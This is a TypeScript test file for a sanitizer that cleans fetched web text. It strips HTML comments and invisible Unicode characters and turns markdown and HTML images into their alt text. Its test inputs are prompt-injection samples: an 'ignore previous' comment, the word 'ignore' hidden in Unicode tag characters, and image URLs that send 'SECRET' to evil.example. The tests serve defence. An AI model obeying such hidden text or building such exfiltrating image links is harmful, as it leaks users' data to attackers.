import { describe, expect, it } from "vitest";
import {
  classifyContentType,
  neutralizeImages,
  prettyJson,
  sanitizeFetchedText,
  sniffBody,
  stripHtmlComments,
  stripInvisible,
} from "./fetchedText";

describe("classifyContentType", () => {
  it.each([
    ["text/html; charset=utf-8", "html"],
    ["application/xhtml+xml", "html"],
    ["application/json", "json"],
    ["application/vnd.api+json; charset=utf-8", "json"],
    ["text/plain", "text"],
    ["text/markdown", "text"],
    ["application/xml", "text"],
    ["image/svg+xml", "binary"],
    ["image/png", "binary"],
    ["application/pdf", "binary"],
    ["application/octet-stream", "binary"],
    ["application/zip", "binary"],
    ["", "unknown"],
    [null, "unknown"],
  ])("%s is %s", (type, kind) => {
    expect(classifyContentType(type)).toBe(kind);
  });
});

describe("sniffBody", () => {
  it("decides a body with no declared type", () => {
    expect(sniffBody("<!DOCTYPE html><html></html>")).toBe("html");
    expect(sniffBody('{"a": 1}')).toBe("json");
    expect(sniffBody("{not json")).toBe("text");
    expect(sniffBody("hello")).toBe("text");
    expect(sniffBody("PK\u0003\u0004\u0000\u0000")).toBe("binary");
  });
});

describe("prettyJson", () => {
  it("indents valid JSON and leaves a cut body alone", () => {
    expect(prettyJson('{"a":[1,2]}')).toBe(
      '{\n  "a": [\n    1,\n    2\n  ]\n}',
    );
    expect(prettyJson('{"a":[1,')).toBe('{"a":[1,');
  });
});

describe("stripHtmlComments", () => {
  it("removes closed and unclosed comments", () => {
    expect(stripHtmlComments("a<!-- ignore previous -->b")).toBe("ab");
    expect(stripHtmlComments("a<!-- never closed\nsecret")).toBe("a");
    expect(stripHtmlComments("a <!----> b")).toBe("a  b");
  });
});

describe("stripInvisible (T22)", () => {
  it("removes zero-width, bidi and Unicode tag characters", () => {
    const tags = [..."ignore"]
      .map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0)))
      .join("");
    expect(stripInvisible(`he​ll‮o${tags}﻿!`)).toBe("hello!");
  });

  it("keeps ordinary whitespace, accents and emoji", () => {
    expect(stripInvisible("a\tb\nc\r\n é 🙂")).toBe("a\tb\nc\r\n é 🙂");
  });

  it("removes control characters", () => {
    expect(stripInvisible("a\u0000b\u0007c\u007Fd")).toBe("abcd");
  });
});

describe("neutralizeImages (T23)", () => {
  it("replaces a markdown image with its alt text and no URL", () => {
    const out = neutralizeImages(
      "x ![a chart](https://evil.example/?d=SECRET) y",
    );
    expect(out).toBe("x [image: a chart] y");
    expect(out).not.toContain("evil");
  });

  it("handles empty alt, titles, nested parentheses and reference style", () => {
    expect(neutralizeImages('![](https://e.x/?q=1 "t")')).toBe("[image]");
    expect(neutralizeImages("![f](https://e.x/a_(b)?q=SECRET)")).toBe(
      "[image: f]",
    );
    expect(neutralizeImages("![f][ref]\n\n[ref]: x")).toBe(
      "[image: f]\n\n[ref]: x",
    );
  });

  it("handles an image inside a link and several images", () => {
    expect(
      neutralizeImages(
        "[![logo](https://e.x/i.png)](https://site.test/) ![b](c)",
      ),
    ).toBe("[[image: logo]](https://site.test/) [image: b]");
  });

  it("replaces an HTML img tag", () => {
    expect(neutralizeImages('<img src="https://e.x/?q=S" alt="cat">')).toBe(
      "[image: cat]",
    );
    expect(neutralizeImages("<IMG SRC=https://e.x/?q=S>")).toBe("[image]");
  });

  it("leaves a lone ![ and ordinary links alone", () => {
    expect(neutralizeImages("wow![ nothing")).toBe("wow![ nothing");
    expect(neutralizeImages("[a](https://x.test)")).toBe("[a](https://x.test)");
  });
});

describe("sanitizeFetchedText", () => {
  it("applies all of them, so an image split by an invisible character is still caught", () => {
    expect(
      sanitizeFetchedText("<!-- x -->!​[a](https://evil.example/?q=1)ok"),
    ).toBe("[image: a]ok");
  });
});
